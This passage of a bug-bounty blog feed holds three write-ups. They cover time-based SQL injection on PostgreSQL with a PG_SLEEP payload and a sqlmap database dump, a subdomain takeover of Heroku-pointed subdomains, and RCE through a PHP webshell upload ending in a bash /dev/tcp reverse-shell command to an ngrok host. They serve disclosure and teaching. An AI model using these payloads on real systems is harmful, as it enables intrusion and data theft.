+<p>I quickly copied the POST request to the file and passed it into the <a href="https://sqlmap.org/">sqlmap</a> to automate the process so I can find the backend database.</p>
+
+<p><img src="3.webp" alt="img" /></p>
+
+<p>And the Backend Database is PostgreSQL. At the first time when I tried to get the database banner sqlmap shown me that the JSON object <strong>abc_serial_no</strong> is vulnerable to time-based SQL injection. So I applied the payload and observed that the response from the server response is 5,044ms delayed which is working as expected the payload I injected is <code class="language-plaintext highlighter-rouge">abc_serial_no”:”1' AND 9520=(SELECT 9520 FROM PG_SLEEP(5)) AND ‘GRTs’=’GRTs”</code></p>
+
+<p><img src="4.webp" alt="img" /></p>
+
+<p>So then I quickly tried to retrieve the database by using sqlmap as below,</p>
+
+<p><img src="5.webp" alt="img" /></p>
+
+<p>The sqlmap automated the entire process and provided me the whole database.</p>
+
+<h2 id="references">References</h2>
+<ul>
+  <li><a href="https://portswigger.net/web-security/sql-injection">https://portswigger.net/web-security/sql-injection</a></li>
+  <li><a href="https://github.com/thevillagehacker/Bug-Hunting/tree/main/SQL-Payloads">https://github.com/thevillagehacker/Bug-Hunting/tree/main/SQL-Payloads</a></li>
+  <li><a href="https://owasp.org/www-community/attacks/SQL_Injection">https://owasp.org/www-community/attacks/SQL_Injection</a></li>
+  <li><a href="https://www.w3schools.com/sql/sql_injection.asp">https://www.w3schools.com/sql/sql_injection.asp</a></li>
+</ul>
+
+<p>Thank you for reading.</p>
+
+<p>Follow me on Twitter : <a href="https://twitter.com/thevillagehackr">thevillagehacker</a></p>]]></content><author><name>Naveen J</name><email>nvnj1998@gmail.com</email></author><category term="SQL Injection" /><category term="Misconfiguration" /><summary type="html"><![CDATA[Time-Based SQL Injection to Dumping the Database.]]></summary></entry><entry><title type="html">Massive Subdomains Take Over</title><link href="http://localhost:4000/massive_subdomain-takeover/" rel="alternate" type="text/html" title="Massive Subdomains Take Over" /><published>2021-05-08T12:00:00+00:00</published><updated>2021-05-08T12:00:00+00:00</updated><id>http://localhost:4000/massive_subdomain-takeover</id><content type="html" xml:base="http://localhost:4000/massive_subdomain-takeover/"><![CDATA[<p>Hello all, It’s been a long time I hope everyone on planet earth is okay during this pandemic situation. Today I came up with a new writeup which is I found recently.</p>
+
+<p>I mostly work on responsible disclosure because I thought I can help the companies who can’t afford the pen-testing services. So let’s get started, the program is a responsible disclosure program as I always do. let’s consider the target as abc.com and I started my recon as I always do. The target has 2000+ subdomains and I thought wow I am going to have a very big time working on this target.</p>
+
+<p>So I thought let’s start with subdomain recons I used <a href="https://github.com/projectdiscovery/dnsx">dnsx</a> to recon all the subdomains CNAME records. I luckily found out that the 20 + subdomain of the target having CNAME records pointing to <a href="https://www.heroku.com/">Heroku</a> cloud services.</p>
+
+<p>So I did my homework to takeover the subdomains and I found this good article <a href="https://0xpatrik.com/subdomain-takeover-providers/">Subdomain Takeover: Identifying Providers</a>. So I quickly wanted things to be done faster and I used the grep to filter the results that match “Heroku” and got 20+ subdomains.</p>
+
+<p><strong>dnsx results</strong>
+<img src="1.webp" alt="img" /></p>
+
+<p>We gotta filter the results to check if the subdomains are vulnerable or not. I quickly did this bash trick to filter out the results as below,</p>
+
+<p>First I have to extract the Heroku subdomains from the results, due to the non-disclosure agreements I can’t disclose the targets.</p>
+
+<p><code class="language-plaintext highlighter-rouge">cat vuln-subs.txt | awk ‘{print $2}’</code></p>
+
+<p><img src="2.webp" alt="img" /></p>
+
+<p>Now we need to remove the open and close bracket present at the start and end of the line. Now this command will sort out our problem.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cat </span>vuln-subs.txt | <span class="nb">awk</span> ‘<span class="o">{</span>print <span class="nv">$2</span><span class="o">}</span>’ | <span class="nb">awk</span> ‘<span class="o">{</span>print substr<span class="o">(</span><span class="nv">$0</span>,2,length<span class="o">()</span><span class="nt">-2</span><span class="o">)</span><span class="p">;</span><span class="o">}</span>’
+</code></pre></div></div>
+
+<p><img src="3.webp" alt="img" /></p>
+
+<p>Now we got everything to automate the process. Now I can run all those subdomains with <a href="https://github.com/LukaSikic/subzy">subzy</a>.</p>
+
+<p><img src="4.webp" alt="img" /></p>
+
+<p>Not all of the subdomains are vulnerable to take over, those subdomains which are not having any apps deployed on them are vulnerable to take over.</p>
+
+<p><img src="5.webp" alt="img" /></p>
+
+<p>So now I have to check if there are any apps deployed on those subdomains yet. So I quickly checked the response of those subdomains to verify that the apps are deployed or not by using curl.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">for </span>i <span class="k">in</span> <span class="sb">`</span><span class="nb">cat </span>vuln-heroku-subs.txt<span class="sb">`</span><span class="p">;</span> <span class="k">do </span><span class="nb">echo</span> <span class="nv">$i</span><span class="p">;</span> curl — <span class="nb">head</span> <span class="nv">$i</span><span class="p">;</span> <span class="k">done</span><span class="p">;</span>
+</code></pre></div></div>
+
+<p><img src="6.webp" alt="img" /></p>
+
+<p>So as per my recon, it seems the subdomains with 404 response are vulnerable takeover, I cross verified those results with subzy results and came up with this conclusion.</p>
+
+<p>I quickly created a good Proof of concept and reported to the respective company.</p>
+
+<p>Thank you for reading.</p>
+
+<p>Follow me on Twitter : <a href="https://twitter.com/thevillagehackr">thevillagehacker</a></p>]]></content><author><name>Naveen J</name><email>nvnj1998@gmail.com</email></author><category term="Subdomain Takeover" /><category term="Misconfiguration" /><summary type="html"><![CDATA[Massive Subdomains Take Over.]]></summary></entry><entry><title type="html">RCE via File Upload</title><link href="http://localhost:4000/RCE-via-fileupload/" rel="alternate" type="text/html" title="RCE via File Upload" /><published>2021-04-07T12:00:00+00:00</published><updated>2021-04-07T12:00:00+00:00</updated><id>http://localhost:4000/RCE-via-fileupload</id><content type="html" xml:base="http://localhost:4000/RCE-via-fileupload/"><![CDATA[<h1 id="remote-code-execution">Remote Code Execution</h1>
+<p>Remote code execution (RCE) refers to the ability of a cyber attacker to access and make changes to a computer owned by another, without authority and regardless of where the computer is geographically located. RCE allows an attacker to take over a computer or a server by running arbitrary malicious software (malware).</p>
+
+<p>Found a target using google dorks which having a responsible disclosure program. Let’s consider the target as abc.com the target website. During recon, I found that the target company owns 7 subdomains and each of them is integrated with the parent domain abc.com with some functionalities.</p>
+
+<p>So I quickly started doing directory brute-forcing to figure out the directories and guess what the website is fully made up of PHP, so if I found a way to upload a php file I can get a reverse shell. The website having a career page which we can upload pdf file as a resume.</p>
+
+<p>At the time of my recon, I found an uploads folder which contains all the uploaded documents of peoples who applied for jobs through this career page.</p>
+
+<p><strong>Directory brute-forcing using dirsearch</strong>
+<img src="1.webp" alt="img" /></p>
+
+<p><strong>Index of uploaded files</strong>
+<img src="2.webp" alt="img" /></p>
+
+<p>So I quickly directed to the https://www.abc.com/careers.php careers page and checked the CV upload functionality but the application is validating the file extensions at the front end only.</p>
+
+<p><strong>validating file extension at frontend</strong>
+<img src="3.webp" alt="img" /></p>
+
+<p>So I quickly downloaded the PHP webshell and uploaded successfully</p>
+
+<p><img src="4.webp" alt="img" /></p>
+
+<p>All required information are filled and click submit then intercepted the request and changed the file extension from pdf to PHP</p>
+
+<p><strong>uploaded webshell</strong>
+<img src="5.webp" alt="img" /></p>
+
+<p>Then I quickly directed to the uploaded shell file location to trigger the PHP web shell.</p>
+
+<p><strong>webshell</strong>
+<img src="6.webp" alt="img" /></p>
+
+<p>Finally, the webshell is working perfectly. To get a reverse shell we can upload the reverse shell instead of the webshell or we can simply use the below command on the web shell console to get access via port forwarding by using ngrok services.</p>
+
+<h3 id="php-webshell">PHP webshell</h3>
+<p><a href="https://github.com/thevillagehacker/Bug-Hunting/blob/main/Rev-shell/php_web_shell.php">GitHub Repo</a></p>
+
+<h2 id="getting-reverse-shell">Getting Reverse Shell</h2>
+<ul>
+  <li>Enable port forwarding</li>
+  <li>Listen to forwarded port using Netcat</li>
+</ul>
+
+<p><strong>port forwarding setup using ngrok</strong>
+<img src="7.webp" alt="img" /></p>
+
+<p>Now the port forwarding is completed we can get the shell by executing the following command in the webshell input field</p>
+
+<p><code class="language-plaintext highlighter-rouge">bash -i &gt;&amp; /dev/tcp/0.tcp.ngrok.io/1000 0&gt;&amp;1</code></p>
+
+<p><strong>execute reverse connection via bash</strong></p>
+
+<p><img src="8.webp" alt="img" /></p>
+
+<p>Now we got the reverse shell successfully.</p>
+
+<p><img src="9.webp" alt="img" /></p>
+
+<p>Thank you for reading.</p>
+
+<p>Follow me on Twitter : <a href="https://twitter.com/thevillagehackr">thevillagehacker</a></p>]]></content><author><name>Naveen J</name><email>nvnj1998@gmail.com</email></author><category term="Remote Code Execution" /><category term="Misconfiguration" /><summary type="html"><![CDATA[Remote Code Execution Due to Unrestricted File Upload.]]></summary></entry></feed>
